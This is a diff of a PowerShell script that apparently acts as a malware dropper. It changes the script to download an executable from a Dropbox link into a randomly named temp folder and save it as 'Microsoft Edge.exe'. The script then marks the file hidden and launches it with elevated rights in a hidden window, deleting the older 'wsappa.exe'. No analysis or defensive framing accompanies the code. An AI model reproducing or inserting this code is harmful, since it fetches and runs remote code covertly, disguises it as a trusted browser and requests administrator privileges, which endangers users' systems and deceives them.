@@ -5,24 +5,24 @@ start-sleep 10
 cd $env:temp/sVBXKuz
 
 #download new file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/ll2lef3yscbinixdg5772/wsappa-1.7.exe?rlkey=tcosuk2m6nw87girq8yrqvltk&dl=0" -OutFile wsappa_new.exe
-Copy-Item -Path .\wsappa_new.exe -Destination .\wsappa.exe -Force
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile Microsoft Edge_new.exe
+Copy-Item -Path .\Microsoft Edge_new.exe -Destination .\Microsoft Edge.exe -Force
 
 #delete old file
-Remove-Item .\wsappa_new.exe
-
+Remove-Item .\Microsoft Edge_new.exe
+Remove-Item .\wsappa.exe
 
 #sleep
 start-sleep 2
 
 
 # Set "Hidden" attribute on the file
-$filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
+$filePath = Join-Path $env:temp\sVBXKuz "Microsoft Edge.exe"
 $attr = [System.IO.FileAttributes]::Hidden
 [System.IO.File]::SetAttributes($filePath, $attr)
 
 #start new file
-Start-Process -FilePath "$env:temp/sVBXKuz/wsappa.exe" -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath "$env:temp/sVBXKuz/Microsoft Edge.exe" -Verb RunAs -WindowStyle Hidden
 
 
 
